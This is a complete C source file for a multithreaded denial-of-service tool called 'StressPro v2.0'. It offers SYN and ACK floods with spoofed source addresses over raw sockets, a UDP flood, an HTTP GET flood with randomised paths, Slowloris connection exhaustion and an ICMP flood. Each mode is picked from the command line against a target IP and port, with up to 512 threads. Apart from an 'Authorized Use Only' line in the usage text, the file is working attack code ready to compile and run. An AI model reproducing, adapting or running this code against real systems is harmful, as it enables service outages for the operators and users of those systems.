#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <fcntl.h>

#define MAX_THREADS 512
#define MAX_PACKET_SIZE 65535
#define HTTP_USER_AGENT "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

volatile int running = 1;
struct target {
    char ip[64];
    int port;
    int mode;
    int threads;
    char uri[256];
};

/* --- Checksum calculation --- */
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) { sum += *buf++; len -= 2; }
    if (len) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

/* --- Random string generator --- */
void rand_str(char *dst, int len) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < len - 1; i++)
        dst[i] = charset[rand() % (sizeof(charset) - 1)];
    dst[len - 1] = '\0';
}

/* --- SYN Flood --- */
void *syn_flood(void *arg) {
    struct target *t = (struct target *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket"); return NULL; }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &dst.sin_addr);

    char packet[MAX_PACKET_SIZE] = {0};
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    struct in_addr src_addr;
    srand(time(NULL) ^ pthread_self());

    while (running) {
        memset(packet, 0, sizeof(packet));
        
        src_addr.s_addr = rand() | (rand() << 16);
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 64 + (rand() % 64);
        ip->protocol = IPPROTO_TCP;
        ip->saddr = src_addr.s_addr;
        ip->daddr = dst.sin_addr.s_addr;
        ip->check = 0;

        tcp->source = htons(1024 + (rand() % 64511));
        tcp->dest = htons(t->port);
        tcp->seq = htonl(rand() % 0xFFFFFFFF);
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(5840 + (rand() % 4096));
        tcp->check = 0;
        tcp->urg_ptr = 0;

        /* Pseudo header for TCP checksum */
        struct pseudo_header {
            u_int32_t src, dst;
            u_int8_t zero;
            u_int8_t proto;
            u_int16_t len;
        } psh;
        psh.src = ip->saddr;
        psh.dst = ip->daddr;
        psh.zero = 0;
        psh.proto = IPPROTO_TCP;
        psh.len = htons(sizeof(struct tcphdr));
        
        char pseudo_pkt[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(pseudo_pkt, &psh, sizeof(psh));
        memcpy(pseudo_pkt + sizeof(psh), tcp, sizeof(struct tcphdr));
        tcp->check = checksum((unsigned short *)pseudo_pkt, sizeof(pseudo_pkt));

        ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(sock);
    return NULL;
}

/* --- ACK Flood --- */
void *ack_flood(void *arg) {
    struct target *t = (struct target *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket"); return NULL; }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &dst.sin_addr);

    char packet[MAX_PACKET_SIZE] = {0};
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    while (running) {
        memset(packet, 0, sizeof(packet));
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 64 + (rand() % 64);
        ip->protocol = IPPROTO_TCP;
        ip->saddr = rand() | (rand() << 16);
        ip->daddr = dst.sin_addr.s_addr;
        ip->check = 0;

        tcp->source = htons(1024 + (rand() % 64511));
        tcp->dest = htons(t->port);
        tcp->seq = htonl(rand() % 0xFFFFFFFF);
        tcp->ack_seq = htonl(rand() % 0xFFFFFFFF);
        tcp->doff = 5;
        tcp->ack = 1;
        tcp->window = htons(5840 + (rand() % 4096));
        tcp->check = 0;
        tcp->urg_ptr = 0;

        struct pseudo_header {
            u_int32_t src, dst;
            u_int8_t zero;
            u_int8_t proto;
            u_int16_t len;
        } psh;
        psh.src = ip->saddr;
        psh.dst = ip->daddr;
        psh.zero = 0;
        psh.proto = IPPROTO_TCP;
        psh.len = htons(sizeof(struct tcphdr));
        
        char pseudo_pkt[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(pseudo_pkt, &psh, sizeof(psh));
        memcpy(pseudo_pkt + sizeof(psh), tcp, sizeof(struct tcphdr));
        tcp->check = checksum((unsigned short *)pseudo_pkt, sizeof(pseudo_pkt));
        ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(sock);
    return NULL;
}

/* --- UDP Flood --- */
void *udp_flood(void *arg) {
    struct target *t = (struct target *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) { perror("socket"); return NULL; }

    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &dst.sin_addr);

    char payload[1472];
    srand(time(NULL) ^ pthread_self());

    while (running) {
        int len = 64 + (rand() % 1408);
        for (int i = 0; i < len; i++) payload[i] = rand() % 256;
        sendto(sock, payload, len, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(sock);
    return NULL;
}

/* --- HTTP GET Flood --- */
void *http_get_flood(void *arg) {
    struct target *t = (struct target *)arg;
    char host[256];
    strcpy(host, t->ip);

    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) continue;

        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(t->port);
        inet_pton(AF_INET, t->ip, &dst.sin_addr);

        struct timeval tv = {2, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char buf[4096];
            char rand_path[64];
            rand_str(rand_path, 32);
            snprintf(buf, sizeof(buf),
                "GET /%s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: */*\r\n"
                "Accept-Language: en-US,en;q=0.9\r\n"
                "Connection: keep-alive\r\n"
                "Cache-Control: no-cache\r\n"
                "Pragma: no-cache\r\n"
                "\r\n",
                rand_path, host, HTTP_USER_AGENT);
            send(sock, buf, strlen(buf), 0);
            usleep(1000);
        }
        close(sock);
    }
    return NULL;
}

/* --- Slowloris --- */
void *slowloris(void *arg) {
    struct target *t = (struct target *)arg;
    char host[256];
    strcpy(host, t->ip);

    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) continue;

        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(t->port);
        inet_pton(AF_INET, t->ip, &dst.sin_addr);

        struct timeval tv = {10, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char buf[4096];
            snprintf(buf, sizeof(buf),
                "GET /%s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n",
                t->uri, host, HTTP_USER_AGENT);
            send(sock, buf, strlen(buf), 0);

            /* Keep sending headers slowly */
            for (int i = 0; i < 500 && running; i++) {
                char header[128];
                snprintf(header, sizeof(header), "X-Random-%d: %d\r\n", rand() % 10000, rand() % 10000);
                send(sock, header, strlen(header), 0);
                usleep(50000 + (rand() % 100000)); /* 50-150ms between headers */
            }
        }
        close(sock);
    }
    return NULL;
}

/* --- ICMP Flood --- */
void *icmp_flood(void *arg) {
    struct target *t = (struct target *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) { perror("socket (need root)"); return NULL; }

    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = 0;
    inet_pton(AF_INET, t->ip, &dst.sin_addr);

    char packet[MAX_PACKET_SIZE] = {0};
    struct icmphdr {
        u_int8_t type;
        u_int8_t code;
        u_int16_t checksum;
        u_int16_t id;
        u_int16_t sequence;
    } *icmp = (struct icmphdr *)packet;

    srand(time(NULL) ^ pthread_self());
    int id = getpid() & 0xFFFF;

    while (running) {
        memset(packet, 0, sizeof(packet));
        icmp->type = 8; /* Echo request */
        icmp->code = 0;
        icmp->id = htons(id);
        icmp->sequence = htons(rand() % 65535);
        
        int payload_len = 64 + (rand() % 256);
        for (int i = 0; i < payload_len; i++)
            packet[sizeof(*icmp) + i] = rand() % 256;
        
        icmp->checksum = 0;
        icmp->checksum = checksum((unsigned short *)packet, sizeof(*icmp) + payload_len);

        sendto(sock, packet, sizeof(*icmp) + payload_len, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(sock);
    return NULL;
}

/* --- Signal handler --- */
void handle_sigint(int sig) {
    (void)sig;
    running = 0;
    printf("\n[!] Stopping attack...\n");
}

/* --- Usage --- */
void usage(const char *prog) {
    fprintf(stderr,
        "StressPro - Network Stress Testing Tool (Authorized Use Only)\n"
        "Usage: %s <target> <port> <mode> <threads> [uri]\n\n"
        "Modes:\n"
        "  tcp-syn     SYN flood (requires root)\n"
        "  tcp-ack     ACK flood (requires root)\n"
        "  udp-flood   UDP flood\n"
        "  http-get    HTTP GET flood\n"
        "  slowloris   Slowloris connection exhaustion\n"
        "  icmp        ICMP echo flood (requires root)\n\n"
        "Example:\n"
        "  %s 192.168.1.1 80 http-get 200\n"
        "  %s 192.168.1.1 443 tcp-syn 100\n"
        "  %s 192.168.1.1 80 slowloris 500 /\n",
        prog, prog, prog, prog);
    exit(1);
}

/* --- Main --- */
int main(int argc, char **argv) {
    if (argc < 5) usage(argv[0]);

    struct target t;
    strncpy(t.ip, argv[1], sizeof(t.ip) - 1);
    t.port = atoi(argv[2]);
    t.threads = atoi(argv[4]);
    strcpy(t.uri, "/");

    if (t.port <= 0 || t.port > 65535) {
        fprintf(stderr, "[-] Invalid port\n");
        return 1;
    }
    if (t.threads < 1 || t.threads > MAX_THREADS) {
        fprintf(stderr, "[-] Threads must be 1-%d\n", MAX_THREADS);
        return 1;
    }

    if (strcmp(argv[3], "tcp-syn") == 0) t.mode = 1;
    else if (strcmp(argv[3], "tcp-ack") == 0) t.mode = 2;
    else if (strcmp(argv[3], "udp-flood") == 0) t.mode = 3;
    else if (strcmp(argv[3], "http-get") == 0) t.mode = 4;
    else if (strcmp(argv[3], "slowloris") == 0) {
        t.mode = 5;
        if (argc > 5) strncpy(t.uri, argv[5], sizeof(t.uri) - 1);
    }
    else if (strcmp(argv[3], "icmp") == 0) t.mode = 6;
    else {
        fprintf(stderr, "[-] Unknown mode: %s\n", argv[3]);
        usage(argv[0]);
    }

    signal(SIGINT, handle_sigint);

    const char *mode_names[] = {"", "TCP SYN Flood", "TCP ACK Flood", "UDP Flood", "HTTP GET Flood", "Slowloris", "ICMP Flood"};
    printf("[*] StressPro v2.0\n");
    printf("[*] Target: %s:%d\n", t.ip, t.port);
    printf("[*] Mode: %s\n", mode_names[t.mode]);
    printf("[*] Threads: %d\n", t.threads);
    printf("[*] Press Ctrl+C to stop\n\n");

    pthread_t threads[MAX_THREADS];
    void *(*funcs[])(void *) = {NULL, syn_flood, ack_flood, udp_flood, http_get_flood, slowloris, icmp_flood};

    for (int i = 0; i < t.threads; i++) {
        pthread_create(&threads[i], NULL, funcs[t.mode], &t);
        usleep(100); /* Stagger thread creation */
    }

    for (int i = 0; i < t.threads; i++)
        pthread_join(threads[i], NULL);

    printf("[*] Attack stopped.\n");
    return 0;
}
